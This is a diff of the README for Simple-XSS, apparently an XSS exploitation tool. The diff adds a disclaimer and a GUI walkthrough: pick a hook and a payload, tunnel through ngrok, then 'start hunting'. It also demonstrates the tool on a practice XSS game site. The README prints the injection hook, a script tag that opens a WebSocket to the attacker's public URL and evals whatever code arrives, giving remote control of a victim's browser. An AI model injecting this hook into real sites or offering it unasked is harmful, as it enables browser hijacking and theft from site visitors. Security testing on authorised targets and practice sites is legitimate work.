@@ -4,19 +4,67 @@
   <img src="res/big_logo.png"  alt="logo"/>
 </p>
 
-<a href="https://github.com/CrazyProger1/Simple-XSS/releases/download/V0.1/Simple-XSS-Windows-x64.zip"><img alt="GitHub all releases" src="https://img.shields.io/github/downloads/CrazyProger1/Simple-XSS/total"></a>
+<a href="https://github.com/CrazyProger1/Simple-XSS/releases/download/V0.2/Simple-XSS-Windows-x64.zip"><img alt="GitHub all releases" src="https://img.shields.io/github/downloads/CrazyProger1/Simple-XSS/total"></a>
 <a href="https://github.com/CrazyProger1/Simple-XSS/blob/master/LICENSE"><img alt="GitHub" src="https://img.shields.io/github/license/CrazyProger1/Simple-XSS"></a>
 <a href="https://github.com/CrazyProger1/Simple-XSS/releases/latest"><img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/CrazyProger1/Simple-XSS"></a>
 
-Simple-XSS is a multiplatform cross-site scripting (XSS) vulnerability exploitation tool. This application will help you
+Simple-XSS is a multi-platform cross-site scripting (XSS) vulnerability exploitation tool for pentesting. This application will help you
 create a hook that can easily
 and reliably catch a client by downloading a payload to their browser and executing it. You don't even need a white IP
 for this because the application will take care of tunneling the connection between you and the victim.
+
+**Disclaimer:** This program is provided for educational and research purposes only.
+The creator of this program does not condone or support any illegal or malicious activity,
+and will not be held responsible for any such actions taken by others who may use this program.
+By downloading or using this program, you acknowledge that you are solely responsible for any consequences
+that may result from the use of this program.
 
 ## Usage
 
 > Use `--help` argument to get help.
 ![commandline help](docs/help.png)
+
+### GUI-Guide
+
+Firstly, choose the hook. [Default hook](hooks/default) is the simplest hook, it is only suitable for forms without XSS
+protection:
+
+![step 1](docs/step_1.png)
+
+Then, choose the payload. [Hello world payload](payloads/hello_world) is an example payload, it just alerts "Hello,
+World!":
+
+![step 2](docs/step_2.png)
+
+Now, lets set up tunneling. Tunneling is needed to make a local server public. You have 2 options:
+
+1) use one of the suggested tunneling apps (now it's only [ngrok](https://ngrok.com/))
+2) tunnel ports yourself and pass the public URL of the HTTP tunnel to the program
+
+![step 3](docs/step_3_1.png)
+
+![step 3](docs/step_3_2.png)
+
+Finally, you can run the process!
+
+![step 4](docs/step_4.png)
+
+Now you can copy the hook and start hunting ;D
+
+![step 5](docs/step_5.png)
+
+To demonstrate the possibilities, we can use site [xss-game.appspot.com](https://xss-game.appspot.com/).
+Enter the hook into search form:
+
+![step 6](docs/step_6.png)
+
+Press "Search". As you can see, we have the alert dialog!
+
+![step 7](docs/step_7.png)
+
+Also, we have "Hello, World!" in our console:
+![step 8](docs/step_8.png)
+
 
 ### Hook
 
@@ -26,8 +74,7 @@ for this because the application will take care of tunneling the connection betw
 
 ```html
 
-<script>c = new WebSocket('{{environment.public_url}}');
-c.onmessage = (e) => eval(e.data);</script>
+<script>c = new WebSocket('{{environment.public_url}}');c.onmessage = (e) => eval(e.data);</script>
 ```
 
 **NOTE:** _As you can see here is a built-in variable: {{environment.public_url}}. You can read more about
@@ -89,7 +136,7 @@ templating engine. It contains additional information that may be needed when lo
 
 #### Environment
 
-- public_url - public address of WebSocket server
+- **public_url** - public address of WebSocket server
 
 #### Metadata
 
